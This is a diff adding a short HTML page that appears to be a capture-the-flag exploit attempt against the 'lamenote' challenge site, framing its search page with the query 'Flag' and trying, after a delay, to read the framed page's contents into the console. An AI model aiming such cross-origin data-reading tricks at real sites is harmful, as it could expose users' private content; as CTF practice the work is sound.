@@ -1,0 +1,13 @@
+<html>
+<body>
+      <iframe id="test" src="https://lamenote-web.chal.irisc.tf/search?query=Flag" width=200 height=200 sandbox="allow-forms allow-same-origin allow-scripts"></iframe>
+</body>
+<script>
+
+setTimeout(function(){
+  {  
+	console.log(document.getElementById("test").contentWindow.document.getElementsByTagName("body")[0].innerHTML);
+  }
+},3000);
+</script>
+</html>
